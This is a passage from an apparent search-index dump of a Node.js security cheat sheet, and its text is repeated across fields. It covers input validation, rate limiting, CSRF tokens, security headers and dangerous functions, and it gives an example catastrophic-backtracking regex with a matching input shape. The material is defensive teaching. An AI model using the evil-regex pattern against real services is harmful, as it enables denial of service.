run first. For example, consider the following code: const fs = require ( 'fs' ); fs . readFile ( '/file.txt' , ( err , data ) => { // perform actions on file content }); fs . unlinkSync ( '/file.txt' ); In the above example, unlinkSync function may run before the callback, which will delete the file before the desired actions on the file content is done. Such race conditions can also impact the security of your application. An example would be a scenario where authentication is performed in callback and authenticated actions are run synchronously. In order to eliminate such race conditions, you can write all operations that rely on each other in a single non-blocking function. By doing so, you can guarantee that all operations are executed in the correct order. For example, above code example can be written in a non-blocking way as follows: const fs = require ( 'fs' ); fs . readFile ( '/file.txt' , ( err , data ) => { // perform actions on file content fs . unlink ( '/file.txt' , ( err ) => { if ( err ) throw err ; }); }); In the above code, call to unlink the file and other file operations are within the same callback. This provides the correct order of operations. Perform input validation \u00b6 Input validation is a crucial part of application security. Input validation failures can result in many different types of application attacks. These include SQL Injection, Cross-Site Scripting, Command Injection, Local/Remote File Inclusion, Denial of Service, Directory Traversal, LDAP Injection and many other injection attacks. In order to avoid these attacks, input to your application should be sanitized first. The best input validation technique is to use a white list of accepted inputs. However, if this is not possible, input should be first checked against expected input scheme and dangerous inputs should be escaped. In order to ease input validation in Node.js applications, there are some modules like validator and mongo-express-sanitize . For detailed information on input validation, please refer to Input Validation Cheat Sheet . Perform output escaping \u00b6 In addition to input validation, you should escape all HTML and JavaScript content shown to users via application in order to prevent cross-site scripting (XSS) attacks. You can use escape-html or node-esapi libraries to perform output escaping. Perform application activity logging \u00b6 Logging application activity is an encouraged good practice. It makes it easier to debug any errors encountered during application runtime. It is also useful for security concerns, since it can be used during incident response. Also, these logs can be used to feed Intrusion Detection/Prevention Systems (IDS/IPS). In Node.js, there are some modules like Winston or Bunyan to perform application activity logging. These modules enable streaming and querying logs. Also, they provide a way to handle uncaught exceptions. With the following code, you can log application activities in both console and a desired log file. var logger = new ( Winston . Logger ) ({ transports : [ new ( winston . transports . Console )(), new ( winston . transports . File )({ filename : 'application.log' }) ], level : 'verbose' }); Also, you can provide different transports so that you can save errors to a separate log file and general application logs to a different log file. Additional information on security logging can be found in Logging Cheat Sheet . Monitor the event loop \u00b6 When your application server is under heavy network traffic, it may not be able to serve its users. This is essentially a type of Denial of Service (DoS) attack. The toobusy-js module allows you to monitor the event loop. It keeps track of the response time, and when it goes beyond a certain threshold, this module can indicate your server is too busy. In that case, you can stop processing incoming requests and send them 503 Server Too Busy message so that your application stay responsive. Example use of the toobusy-js module is shown here: var toobusy = require ( 'toobusy-js' ); var express = require ( 'express' ); var app = express (); app . use ( function ( req , res , next ) { if ( toobusy ()) { // log if you see necessary res . send ( 503 , \"Server Too Busy\" ); } else { next (); } }); Take precautions against brute-forcing \u00b6 Brute-forcing is a common threat to all web applications. Attackers can use brute-forcing as a password guessing attack to obtain account passwords. Therefore, application developers should take precautions against brute-force attacks especially in login pages. Node.js has several modules available for this purpose. Express-bouncer , express-brute and rate-limiter are just some examples. Based on your needs and requirements, you should choose one or more of these modules and use accordingly. Express-bouncer and express-brute modules work very similar and they both increase the delay with each failed request. They can both be arranged for a specific route. These modules can be used as follows: var bouncer = require ( 'express-bouncer' ); bouncer . whitelist . push ( '127.0.0.1' ); // whitelist an IP address // give a custom error message bouncer . blocked = function ( req , res , next , remaining ) { res . send ( 429 , \"Too many requests have been made. Please wait \" + remaining / 1000 + \" seconds.\" ); }; // route to protect app . post ( \"/login\" , bouncer . block , function ( req , res ) { if ( LoginFailed ){ } else { bouncer . reset ( req ); } }); var ExpressBrute = require ( 'express-brute' ); var store = new ExpressBrute . MemoryStore (); // stores state locally, don't use this in production var bruteforce = new ExpressBrute ( store ); app . post ( '/auth' , bruteforce . prevent , // error 429 if we hit this route too often function ( req , res , next ) { res . send ( 'Success!' ); } ); Apart from express-bouncer and express-brute , rate-limiter module also helps prevent brute-forcing attacks. It enables specifying how many requests a specific IP address can make during a specified time period. var limiter = new RateLimiter (); limiter . addLimit ( '/login' , 'GET' , 5 , 500 ); // login page can be requested 5 times at max within 500 seconds CAPTCHA usage is also another common mechanism used against brute-forcing. There are modules developed for Node.js CAPTCHAs. A common module used in Node.js applications is svg-captcha . It can be used as follows: var svgCaptcha = require ( 'svg-captcha' ); app . get ( '/captcha' , function ( req , res ) { var captcha = svgCaptcha . create (); req . session . captcha = captcha . text ; res . type ( 'svg' ); res . status ( 200 ). send ( captcha . data ); }); Also, account lockout is a recommended solution to keep attackers away from your valid users. Account lockout is possible with many modules like mongoose . You can refer to this blog post to see how account lockout is implemented in mongoose. Use Anti-CSRF tokens \u00b6 Cross-Site Request Forgery (CSRF) aims to perform authorized actions on behalf of an authenticated user, while the user is unaware of this action. CSRF attacks are generally performed for state-changing requests like changing a password, adding users or placing orders. Csurf is an express middleware that can be used to mitigate CSRF attacks. It can be used as follows: var csrf = require ( 'csurf' ); csrfProtection = csrf ({ cookie : true }); app . get ( '/form' , csrfProtection , function ( req , res ) { res . render ( 'send' , { csrfToken : req . csrfToken () }) }) app . post ( '/process' , parseForm , csrfProtection , function ( req , res ) { res . send ( 'data is being processed' ); }); After writing this code, you also need to add csrfToken to your HTML form, which can be easily done as follows: < input type = \"hidden\" name = \"_csrf\" value = \"{{ csrfToken }}\" > For detailed information on cross-site request forgery (CSRF) attacks and prevention methods, you can refer to Cross-Site Request Forgery Prevention . Remove unnecessary routes \u00b6 A web application should not contain any page that is not used by users, as it may increase the attack surface of the application. Therefore, all unused API routes should be disabled in Node.js applications. This occurs especially in frameworks like Sails and Feathers , as they automatically generate REST API endpoints. For example, in Sails , if a URL does not match a custom route, it may match one of the automatic routes and still generate a response. This situation may lead to results ranging from information leakage to arbitrary command execution. Therefore, before using such frameworks and modules, it is important to know the routes they automatically generate and remove or disable these routes. Prevent HTTP Parameter Pollution \u00b6 HTTP Parameter Pollution(HPP) is an attack in which attackers send multiple HTTP parameters with the same name and this causes your application to interpret them in an unpredictable way. When multiple parameter values are sent, Express populates them in an array. In order to solve this issue, you can use hpp module. When used, this module will ignore all values submitted for a parameter in req.query and/or req.body and just select the last parameter value submitted. You can use it as follows: var hpp = require ( 'hpp' ); app . use ( hpp ()); Only return what is necessary \u00b6 Information about the users of an application is among the most critical information about the application. User tables generally include fields like id, username, full name, email address, birth date, password and in some cases social security numbers. Therefore, when querying and using user objects, you need to return only needed fields as it may be vulnerable to personal information disclosure. This is also correct for other objects stored on the database. If you just need a certain field of an object, you should only return the specific fields required. As an example, you can use a function like the following whenever you need to get information on a user. By doing so, you can only return the fields that are needed for your specific operation. In other words, if you only need to list names of the users available, you are not returning their email addresses or credit card numbers in addition to their full names. exports . sanitizeUser = function ( user ) { return { id : user . id , username : user . username , fullName : user . fullName }; }; Use object property descriptors \u00b6 Object properties include 3 hidden attributes: writable (if false, property value cannot be changed), enumerable (if false, property cannot be used in for loops) and configurable (if false, property cannot be deleted). When defining an object property through assignment, these three hidden attributes are set to true by default. These properties can be set as follows: var o = {}; Object . defineProperty ( o , \"a\" , { writable : true , enumerable : true , configurable : true , value : \"A\" }); Apart from these, there are some special functions for object attributes. Object.preventExtensions() prevents new properties from being added to the object. Use access control lists \u00b6 Authorization prevents users from acting outside of their intended permissions. In order to do so, users and their roles should be determined with consideration of the principle of least privilege. Each user role should only have access to the resources they must use. For your Node.js applications, you can use acl module to provide ACL (access control list) implementation. With this module, you can create roles and assign users to these roles. Error & Exception Handling \u00b6 Handle uncaughtException \u00b6 Node.js behavior for uncaught exceptions is to print current stack trace and then terminate the thread. However, Node.js allows customization of this behavior. It provides a global object named process which is available to all Node.js applications. It is an EventEmitter object and in case of an uncaught exception, uncaughtException event gets emitted and it is brought up to the main event loop. In order to provide a custom behavior for uncaught exceptions, you can bind to this event. However, resuming the application after such an uncaught exception can lead to further problems. Therefore, if you do not want to miss any uncaught exception, you should bind to uncaughtException event and cleanup any allocated resources like file descriptors, handles and similar before shutting down the process. Resuming the application is strongly discouraged as the application will be in an unknown state. Also, it is important to note that when displaying error messages to the user in case of an uncaught exception, detailed information like stack traces should not be revealed to the user. Instead, custom error messages should be shown to the users in order not to cause any information leakage. process . on ( \"uncaughtException\" , function ( err ) { // clean up allocated resources // log necessary error details to log files process . exit (); // exit the process to avoid unknown state }); Listen to errors when using EventEmitter \u00b6 When using EventEmitter, errors can occur anywhere in the event chain. Normally, if an error occurs in an EventEmitter object, an error event which has an Error object as an argument is called. However, if there are no attached listeners to that error event, the Error object that is sent as an argument is thrown and becomes an uncaught exception. In short, if you do not handle errors within an EventEmitter object properly, these unhandled errors may crash your application. Therefore, you should always listen to error events when using EventEmitter objects. var events = require ( 'events' ); var myEventEmitter = function (){ events . EventEmitter . call ( this ); } require ( 'util' ). inherits ( myEventEmitter , events . EventEmitter ); myEventEmitter . prototype . someFunction = function ( param1 , param2 ) { //in case of an error this . emit ( 'error' , err ); } var emitter = new myEventEmitter (); emitter . on ( 'error' , function ( err ){ //Perform necessary error handling here }); Handle errors in asynchronous calls \u00b6 Errors that occur within asynchronous callbacks are easy to miss. Therefore, as a general principle first argument to the asynchronous calls should be an Error object. Also, express routes handle errors itself, but it should be always remembered that errors occurred in asynchronous calls made within express routes are not handled, unless an Error object is sent as a first argument. Errors in these callbacks can be propagated as many times as possible. Each callback that the error has been propagated to can ignore, handle or propagate the error. Server Security \u00b6 Set cookie flags appropriately \u00b6 Generally, session information is sent using cookies in web applications. However, improper use of HTTP cookies can render an application to several session management vulnerabilities. There are some flags that can be set for each cookie to prevent these kinds of attacks. httpOnly , Secure and SameSite flags are very important for session cookies. httpOnly flag prevents the cookie from being accessed by client-side JavaScript. This is an effective counter-measure for XSS attacks. Secure flag lets the cookie to be sent only if the communication is over HTTPS. SameSite flag can prevent cookies from being sent in cross-site requests which helps protect against Cross-Site Request Forgery (CSRF) attacks. Apart from these, there are other flags like domain, path and expires. Setting these flags appropriately is encouraged, but they are mostly related to cookie scope not the cookie security. Sample usage of these flags is given in the following example: var session = require ( 'express-session' ); app . use ( session ({ secret : 'your-secret-key' , key : 'cookieName' , cookie : { secure : true , httpOnly : true , path : '/user' , sameSite : true } })); Use appropriate security headers \u00b6 There are several different HTTP security headers that can help you prevent some common attack vectors. These are listed below: Strict-Transport-Security : HTTP Strict Transport Security (HSTS) dictates browsers that the application can only be accessed via HTTPS connections. In order to use it in your application, add the following codes: app . use ( helmet . hsts ()); // default configuration app . use ( helmet . hsts ( \"<max-age>\" , \"<includeSubdomains>\" )); // custom configuration X-Frame-Options : determines if a page can be loaded via a <frame> or an <iframe> element. Allowing the page to be framed may result in Clickjacking attacks. This header can be used with helmet module as follows: app . use ( helmet . xframe ()); // default behavior (DENY) helmet . xframe ( 'sameorigin' ); // SAMEORIGIN helmet . xframe ( 'allow-from' , 'http://alloweduri.com' ); //ALLOW-FROM uri X-XSS-Protection : As described in the XSS Prevention Cheat Sheet , this header should be set to 0 to disable the XSS Auditor. An issue was created in the helmetjs project to be able to set the header to 0 . Once it's updated, this section will be updated to inform the user to disable the XSS auditor properly using helmetjs. X-Content-Type-Options : Even if the server sets a valid Content-Type header in the response, browsers may try to sniff the MIME type of the requested resource. This header is a way to stop this behavior and tell the browser not to change MIME types specified in Content-Type header. It can be configured in the following way: app . use ( helmet . noSniff ()); Content-Security-Policy : Content Security Policy is developed to reduce the risk of attacks like Cross-Site Scripting (XSS) and Clickjacking . Basically, it allows content from a whitelist you decide. It has several directives each of which prohibits loading specific type of a content. You can refer to Content Security Policy Cheat Sheet for detailed explanation of each directive and how to use it. You can implement these settings in your application as follows: const csp = require ( 'helmet-csp' ) app . use ( csp ({ directives : { defaultSrc : [ \"'self'\" ], // default value for all directives that are absent scriptSrc : [ \"'self'\" ], // helps prevent XSS attacks frameAncestors : [ \"'none'\" ], // helps prevent Clickjacking attacks imgSrc : [ \"'self'\" , \"'http://imgexample.com'\" ], styleSrc : [ \"'none'\" ] } })) Cache-Control and Pragma : Cache-Control header can be used to prevent browsers from caching the given responses. This should be done for pages which contains sensitive information about either the user or the application. However, disabling caching for pages that do not contain sensitive information may seriously affect the performance of the application. Therefore, caching should only be disabled for pages that return sensitive information. Appropriate caching controls and headers can be used easily by the following code: app . use ( helmet . noCache ()); The above code sets Cache-Control, Surrogate-Control, Pragma and Expires headers accordingly. X-Download-Options: This header prevents Internet Explorer from executing downloaded files in the site's context. This is achieved with noopen directive. You can do so with the following piece of code: app . use ( helmet . ieNoOpen ()); Expect-CT : Certificate Transparency is a new mechanism developed to fix some structural problems regarding current SSL infrastructure. Expect-CT header may enforce certificate transparency requirements. It can be implemented in your application as follows: var expectCt = require ( 'expect-ct' ); app . use ( expectCt ({ maxAge : 123 })); app . use ( expectCt ({ enforce : true , maxAge : 123 })); app . use ( expectCt ({ enforce : true , maxAge : 123 , reportUri : 'http://example.com' })); Public-Key-Pins : This header increases the security of HTTPS. With this header, a specific cryptographic public key is associated with a specific web server. If the server does not use the pinned keys in future, the browser regards the responses as illegitimate. It can be used as follows: app . use ( helmet . hpkp ({ maxAge : 123 , sha256s : [ 'Ab3Ef123=' , 'ZyxawuV45=' ], reportUri : 'http://example.com' , includeSubDomains : true })); As discussed in Transport Layer Security Cheat Sheet , the decision to use public key pinning should be made with careful consideration, since it may cause locking out users for a long time if used incorrectly. X-Powered-By: X-Powered-By header is used to inform what technology is used in the server side. This is an unnecessary header causing information leakage, so it should be removed from your application. To do so, you can use the hidePoweredBy as follows: app . use ( helmet . hidePoweredBy ()); Also, you can lie about the technologies used with this header. For example, even if your application does not use PHP, you can set X-Powered-By header to seem so. app . use ( helmet . hidePoweredBy ({ setTo : 'PHP 4.2.0' })); Platform Security \u00b6 Keep your packages up-to-date \u00b6 Security of your application depends directly on how secure the third-party packages you use in your application are. Therefore, it is important to keep your packages up-to-date. It should be noted that Using Components with Known Vulnerabilities is still in the OWASP Top 10. You can use OWASP Dependency-Check to see if any of the packages used in the project has a knwon vulnerability. Also you can use Retire.js to check JavaScript libraries with known vulnerabilities. In order to use it, you can run the following commands in the source code folder of your application: npm install -g retire retire There are several other tools you can use to check your dependencies. A more comprehensive list can be found in Vulnerable Dependency Management CS . Do not use dangerous functions \u00b6 There are some JavaScript functions that are dangerous and should only be used where absolutely necessary. To the fullest possible extent, use of such functions and modules should be avoided. The first example is the eval() function. This function takes a string argument and executes it as any other JavaScript source code. Combined with user input, this behavior inherently leads to remote code execution vulnerability. Similarly, calls to child_process.exec are also very dangerous. This function acts as a bash interpreter and sends its arguments to /bin/sh. By injecting input to this function, attackers can execute arbitrary commands on the server. In addition to these functions, there are some modules that require special care when being used. As an example, fs module handles filesystem operations. However, if improperly sanitized user input is fed into this module, your application may become vulnerable to file inclusion and directory traversal vulnerabilities. Similarly, vm module provides APIs for compiling and running code within V8 Virtual Machine contexts. Since it can perform dangerous actions by nature, it should be used within a sandbox. It would not be fair to say that these functions and modules should not be used whatsoever, however, they should be used carefully especially when they use with user input. Also, there are some other functions that may render your application vulnerable. Stay away from evil regexes \u00b6 The Regular expression Denial of Service (ReDoS) is a Denial of Service attack, that exploits the fact that most Regular Expression implementations may reach extreme situations that cause them to work very slowly (exponentially related to input size). An attacker can then cause a program using a Regular Expression to enter these extreme situations and then hang for a very long time. The Regular Expression Denial of Service (ReDoS) is a type of Denial of Service attack which uses regular expressions. Some Regular Expression (Regex) implementations cause extreme situations that makes the application very slow. Attackers can use such regex implementations to cause application to get into these extreme situations and hang for a long time. Such regexes are called evil if application can be stuck on crafted input. Generally, these regexes are exploited by grouping with repetition and alternation with overlapping. For example, the following regular expression ^(([a-z])+.)+[A-Z]([a-z])+$ can be used to specify Java class names. However, a very long string (aaaa...aaaaAaaaaa...aaaa) can also match with this regular expression. There are some tools to check if a regex has a potential for causing denial of service. One example is vuln-regex-detector . Run security linters periodically \u00b6 When developing code, keeping all security tips in mind can be really difficult. Also keeping all team members obey these rules is nearly impossible. This is why there are Static Analysis Security Testing (SAST) tools. These tools do not execute your code, but they simply look for patterns that can contain security risks. As JavaScript is a dynamic and loosely-typed language, linting tools are really essential in the software development life cycle. These tools should be run periodically and the findings should be audited. Another advantage of these tools is the feature that you can add custom rules for patterns that you may see dangerous. ESLint and JSHint are commonly used SAST tools for JavaScript linting. Use strict mode \u00b6 JavaScript has a number of unsafe and dangerous legacy features that should not be used. In order to remove these features, ES5 included a strict mode for developers. With this mode, errors that were silent previously are thrown. It also helps JavaScript engines perform optimizations. With strict mode, previously accepted bad syntax causes real errors. Because of these improvements, you should always use strict mode in your application. In order to enable strict mode, you just need to write \"use strict\"; on top of your code. The following code will generate a ReferenceError: Can't find variable: y on the console which will not be displayed unless strict mode is used. \"use strict\" ; func (); function func () { y = 3.14 ; // This will cause an error (y is not defined) } Adhere to general application security principles \u00b6 This list has mainly focused on issues that are common in Node.js applications. Also, recommendations against these issues are given specific to Node.js environment. Apart from these, there are general security by design principles that apply to web applications regardless of technologies used in application server. You should also keep those principles in mind while developing your applications. Also, you can always refer to OWASP Cheat Sheet Series to learn more about web application vulnerabilities and mitigation techniques used against them. Additional resources about Node.js security \u00b6 Awesome Node.js Security resources","title":"Nodejs Security"},{"location":"cheatsheets/Nodejs_Security_Cheat_Sheet.html#nodejs-security-cheat-sheet","text":"","title":"NodeJS security cheat sheet"},{"location":"cheatsheets/Nodejs_Security_Cheat_Sheet.html#introduction","text":"This cheat sheet lists the things one can use when developing secure Node.js applications. Each item has a brief explanation and solution that is specific to Node.js environment.","title":"Introduction"},{"location":"cheatsheets/Nodejs_Security_Cheat_Sheet.html#context","text":"Node.js applications are increasing in number and they are no different from other frameworks and programming languages. Node.js applications are also prone to all kinds of web application vulnerabilities.","title":"Context"},{"location":"cheatsheets/Nodejs_Security_Cheat_Sheet.html#objective","text":"This cheat sheet aims to provide a list of best practices to follow during development of Node.js applications.","title":"Objective"},{"location":"cheatsheets/Nodejs_Security_Cheat_Sheet.html#recommendations","text":"There are several different recommendations to enhance security of your Node.js applications. There are categorized as: Application Security Error & Exception Handling Server Security Platform Security","title":"Recommendations"},{"location":"cheatsheets/Nodejs_Security_Cheat_Sheet.html#application-security","text":"","title":"Application Security"},{"location":"cheatsheets/Nodejs_Security_Cheat_Sheet.html#use-flat-promise-chains","text":"Asynchronous callback functions are one of the strongest features of Node.js. However, increasing layers of nesting within callback functions can become a problem. Any multistage process can become nested 10 or more levels deep. This problem is called as Pyramid of Doom or Callback Hell. In such a code, the errors and results get lost within the callback. Promises are a good way to write asynchronous code without getting into nested pyramids. Promises provide top-down execution while being asynchronous by delivering errors and results to next .then function. Another advantage of Promises is the way Promises handle the errors. If an error occurs in a Promise class, it skips over the .then functions and invokes the first .catch function it finds. This way Promises bring a higher assurance of capturing and handling errors. As a principle, you can make all your asynchronous code (apart from emitters) return promises. However, it should be noted that Promise calls can also become a pyramid. In order to completely stay away from callback hells, flat Promise chains should be used. If the module you are using does not support Promises, you can convert base object to a Promise by using Promise.promisifyAll() function. The following code snippet is an example of callback hell. function func1 ( name , callback ) { setTimeout ( function () { // operations }, 500 ); } function func2 ( name , callback ) { setTimeout ( function () { // operations }, 100 ); } function func3 ( name , callback ) { setTimeout ( function () { // operations }, 900 ); } function func4 ( name , callback ) { setTimeout ( function () { // operations }, 3000 ); } func1 ( \"input1\" , function ( err , result1 ){ if ( err ){ // error operations } else { //some operations func2 ( \"input2\" , function ( err , result2 ){ if ( err ){ //error operations } else { //some operations func3 ( \"input3\" , function ( err , result3 ){ if ( err ){ //error operations } else { // some operations func4 ( \"input 4\" , function ( err , result4 ){ if ( err ){ // error operations } else { // some operations } }); } }); } }); } }); Above code can be securely written as follows using flat Promise chain: function func1 ( name , callback ) { setTimeout ( function () { // operations }, 500 ); } function func2 ( name , callback ) { setTimeout ( function () { // operations }, 100 ); } function func3 ( name , callback ) { setTimeout ( function () { // operations }, 900 ); } function func4 ( name , callback ) { setTimeout ( function () { // operations }, 3000 ); } func1 ( \"input1\" ) . then ( function ( result ){ return func2 ( \"input2\" ); }) . then ( function ( result ){ return func3 ( \"input3\" ); }) . then ( function ( result ){ return func4 ( \"input4\" ); }) . catch ( function ( error ) { // error operations });","title":"Use flat Promise chains"},{"location":"cheatsheets/Nodejs_Security_Cheat_Sheet.html#set-request-size-limits","text":"Buffering and parsing of request bodies can be resource intensive for the server. If there is no limit on the size of requests, attackers can send request with large request bodies so that they can exhaust server memory or fill disk space. However, fixing a request size limit for all requests may not be the correct behavior, since some requests like those for uploading a file to the server have more content to carry on the request body. Also, input with a JSON type is more dangerous than a multipart input, since parsing JSON is a blocking operation. Therefore, you should set request size limits for different content types. You can accomplish this very easily with express middlewares as follows: app . use ( express . urlencoded ({ limit : \"1kb\" })); app . use ( express . json ({ limit : \"1kb\" })); app . use ( express . multipart ({ limit : \"10mb\" })); app . use ( express . limit ( \"5kb\" )); // this will be valid for every other content type However, it should be noted that attackers can change content type of the request and bypass request size limits. Therefore, before processing the request, data contained in the request should be validated against the content type stated in the request headers. If content type validation for each request affects the performance severely, you can only validate specific content types or request larger than a predetermined size.","title":"Set request size limits"},{"location":"cheatsheets/Nodejs_Security_Cheat_Sheet.html#do-not-block-the-event-loop","text":"Node.js is very different from common application platforms that use threads. Node.js has a single-thread event-driven architecture. By means of this architecture, throughput becomes high and programming model becomes simpler. Node.js is implemented around a non-blocking I/O event loop. With this event loop, there is no waiting on I/O or context switching. The event loop looks for events and dispatches them to handler functions. Because of this, when CPU intensive JavaScript operations are done, the event loop waits for them to finish. This is why such operations are called blocking. To overcome this problem, Node.js allows assigning callbacks to IO-blocked events. This way, the main application is not blocked and callbacks run asynchronously. Therefore, as a general principle, all blocking operations should be done asynchronously so that the event loop is not blocked. Even if you perform blocking operations asynchronously, it is still possible that your application may not serve as expected. This happens if there is a code outside the callback which relies on the code within the callback to run first. For example, consider the following code: const fs = require ( 'fs' ); fs . readFile ( '/file.txt' , ( err , data ) => { // perform actions on file content }); fs . unlinkSync ( '/file.txt' ); In the above example, unlinkSync function may run before the callback, which will delete the file before the desired actions on the file content is done. Such race conditions can also impact the security of your application. An example would be a scenario where authentication is performed in callback and authenticated actions are run synchronously. In order to eliminate such race conditions, you can write all operations that rely on each other in a single non-blocking function. By doing so, you can guarantee that all operations are executed in the correct order. For example, above code example can be written in a non-blocking way as follows: const fs = require ( 'fs' ); fs . readFile ( '/file.txt' , ( err , data ) => { // perform actions on file content fs . unlink ( '/file.txt' , ( err ) => { if ( err ) throw err ; }); }); In the above code, call to unlink the file and other file operations are within the same callback. This provides the correct order of operations.","title":"Do not block the event loop"},{"location":"cheatsheets/Nodejs_Security_Cheat_Sheet.html#perform-input-validation","text":"Input validation is a crucial part of application security. Input validation failures can result in many different types of application attacks. These include SQL Injection, Cross-Site Scripting, Command Injection, Local/Remote File Inclusion, Denial of Service, Directory Traversal, LDAP Injection and many other injection attacks. In order to avoid these attacks, input to your application should be sanitized first. The best input validation technique is to use a white list of accepted inputs. However, if this is not possible, input should be first checked against expected input scheme and dangerous inputs should be escaped. In order to ease input validation in Node.js applications, there are some modules like validator and mongo-express-sanitize . For detailed information on input validation, please refer to Input Validation Cheat Sheet .","title":"Perform input validation"},{"location":"cheatsheets/Nodejs_Security_Cheat_Sheet.html#perform-output-escaping","text":"In addition to input validation, you should escape all HTML and JavaScript content shown to users via application in order to prevent cross-site scripting (XSS) attacks. You can use escape-html or node-esapi libraries to perform output escaping.","title":"Perform output escaping"},{"location":"cheatsheets/Nodejs_Security_Cheat_Sheet.html#perform-application-activity-logging","text":"Logging application activity is an encouraged good practice. It makes it easier to debug any errors encountered during application runtime. It is also useful for security concerns, since it can be used during incident response. Also, these logs can be used to feed Intrusion Detection/Prevention Systems (IDS/IPS). In Node.js, there are some modules like Winston or Bunyan to perform application activity logging. These modules enable streaming and querying logs. Also, they provide a way to handle uncaught exceptions. With the following code, you can log application activities in both console and a desired log file. var logger = new ( Winston . Logger ) ({ transports : [ new ( winston . transports . Console )(), new ( winston . transports . File )({ filename : 'application.log' }) ], level : 'verbose' }); Also, you can provide different transports so that you can save errors to a separate log file and general application logs to a different log file. Additional information on security logging can be found in Logging Cheat Sheet .","title":"Perform application activity logging"},{"location":"cheatsheets/Nodejs_Security_Cheat_Sheet.html#monitor-the-event-loop","text":"When your application server is under heavy network traffic, it may not be able to serve its users. This is essentially a type of Denial of Service (DoS) attack. The toobusy-js module allows you to monitor the event loop. It keeps track of the response time, and when it goes beyond a certain threshold, this module can indicate your server is too busy. In that case, you can stop processing incoming requests and send them 503 Server Too Busy message so that your application stay responsive. Example use of the toobusy-js module is shown here: var toobusy = require ( 'toobusy-js' ); var express = require ( 'express' ); var app = express (); app . use ( function ( req , res , next ) { if ( toobusy ()) { // log if you see necessary res . send ( 503 , \"Server Too Busy\" ); } else { next (); } });","title":"Monitor the event loop"},{"location":"cheatsheets/Nodejs_Security_Cheat_Sheet.html#take-precautions-against-brute-forcing","text":"Brute-forcing is a common threat to all web applications. Attackers can use brute-forcing as a password guessing attack to obtain account passwords. Therefore, application developers should take precautions against brute-force attacks especially in login pages. Node.js has several modules available for this purpose. Express-bouncer , express-brute and rate-limiter are just some examples. Based on your needs and requirements, you should choose one or more of these modules and use accordingly. Express-bouncer and express-brute modules work very similar and they both increase the delay with each failed request. They can both be arranged for a specific route. These modules can be used as follows: var bouncer = require ( 'express-bouncer' ); bouncer . whitelist . push ( '127.0.0.1' ); // whitelist an IP address // give a custom error message bouncer . blocked = function ( req , res , next , remaining ) { res . send ( 429 , \"Too many requests have been made. Please wait \" + remaining / 1000 + \" seconds.\" ); }; // route to protect app . post ( \"/login\" , bouncer . block , function ( req , res ) { if ( LoginFailed ){ } else { bouncer . reset ( req ); } }); var ExpressBrute = require ( 'express-brute' ); var store = new ExpressBrute . MemoryStore (); // stores state locally, don't use this in production var bruteforce = new ExpressBrute ( store ); app . post ( '/auth' , bruteforce . prevent , // error 429 if we hit this route too often function ( req , res , next ) { res . send ( 'Success!' ); } ); Apart from express-bouncer and express-brute , rate-limiter module also helps prevent brute-forcing attacks. It enables specifying how many requests a specific IP address can make during a specified time period. var limiter = new RateLimiter (); limiter . addLimit ( '/login' , 'GET' , 5 , 500 ); // login page can be requested 5 times at max within 500 seconds CAPTCHA usage is also another common mechanism used against brute-forcing. There are modules developed for Node.js CAPTCHAs. A common module used in Node.js applications is svg-captcha . It can be used as follows: var svgCaptcha = require ( 'svg-captcha' ); app . get ( '/captcha' , function ( req , res ) { var captcha = svgCaptcha . create (); req . session . captcha = captcha . text ; res . type ( 'svg' ); res . status ( 200 ). send ( captcha . data ); }); Also, account lockout is a recommended solution to keep attackers away from your valid users. Account lockout is possible with many modules like mongoose . You can refer to this blog post to see how account lockout is implemented in mongoose.","title":"Take precautions against brute-forcing"},{"location":"cheatsheets/Nodejs_Security_Cheat_Sheet.html#use-anti-csrf-tokens","text":"Cross-Site Request Forgery (CSRF) aims to perform authorized actions on behalf of an authenticated user, while the user is unaware of this action. CSRF attacks are generally performed for state-changing requests like changing a password, adding users or placing orders. Csurf is an express middleware that can be used to mitigate CSRF attacks. It can be used as follows: var csrf = require ( 'csurf' ); csrfProtection = csrf ({ cookie : true }); app . get ( '/form' , csrfProtection , function ( req , res ) { res . render ( 'send' , { csrfToken : req . csrfToken () }) }) app . post ( '/process' , parseForm , csrfProtection , function ( req , res ) { res . send ( 'data is being processed' ); }); After writing this code, you also need to add csrfToken to your HTML form, which can be easily done as follows: < input type = \"hidden\" name = \"_csrf\" value = \"{{ csrfToken }}\" > For detailed information on cross-site request forgery (CSRF) attacks and prevention methods, you can refer to Cross-Site Request Forgery Prevention .","title":"Use Anti-CSRF tokens"},{"location":"cheatsheets/Nodejs_Security_Cheat_Sheet.html#remove-unnecessary-routes","text":"A web application should not contain any page that is not used by users, as it may increase the attack surface of the application. Therefore, all unused API routes should be disabled in Node.js applications. This occurs especially in frameworks like Sails and Feathers , as they automatically generate REST API endpoints. For example, in Sails , if a URL does not match a custom route, it may match one of the automatic routes and still generate a response. This situation may lead to results ranging from information leakage to arbitrary command execution. Therefore, before using such frameworks and modules, it is important to know the routes they automatically generate and remove or disable these routes.","title":"Remove unnecessary routes"},{"location":"cheatsheets/Nodejs_Security_Cheat_Sheet.html#prevent-http-parameter-pollution","text":"HTTP Parameter Pollution(HPP) is an attack in which attackers send multiple HTTP parameters with the same name and this causes your application to interpret them in an unpredictable way. When multiple parameter values are sent, Express populates them in an array. In order to solve this issue, you can use hpp module. When used, this module will ignore all values submitted for a parameter in req.query and/or req.body and just select the last parameter value submitted. You can use it as follows: var hpp = require ( 'hpp' ); app . use ( hpp ());","title":"Prevent HTTP Parameter Pollution"},{"location":"cheatsheets/Nodejs_Security_Cheat_Sheet.html#only-return-what-is-necessary","text":"Information about the users of an application is among the most critical information about the application. User tables generally include fields like id, username, full name, email address, birth date, password and in some cases social security numbers. Therefore, when querying and using user objects, you need to return only needed fields as it may be vulnerable to personal information disclosure. This is also correct for other objects stored on the database. If you just need a certain field of an object, you should only return the specific fields required. As an example, you can use a function like the following whenever you need to get information on a user. By doing so, you can only return the fields that are needed for your specific operation. In other words, if you only need to list names of the users available, you are not returning their email addresses or credit card numbers in addition to their full names. exports . sanitizeUser = function ( user ) { return { id : user . id , username : user . username , fullName : user . fullName }; };","title":"Only return what is necessary"},{"location":"cheatsheets/Nodejs_Security_Cheat_Sheet.html#use-object-property-descriptors","text":"Object properties include 3 hidden attributes: writable (if false, property value cannot be changed), enumerable (if false, property cannot be used in for loops) and configurable (if false, property cannot be deleted). When defining an object property through assignment, these three hidden attributes are set to true by default. These properties can be set as follows: var o = {}; Object . defineProperty ( o , \"a\" , { writable : true , enumerable : true , configurable : true , value : \"A\" }); Apart from these, there are some special functions for object attributes. Object.preventExtensions() prevents new properties from being added to the object.","title":"Use object property descriptors"},{"location":"cheatsheets/Nodejs_Security_Cheat_Sheet.html#use-access-control-lists","text":"Authorization prevents users from acting outside of their intended permissions. In order to do so, 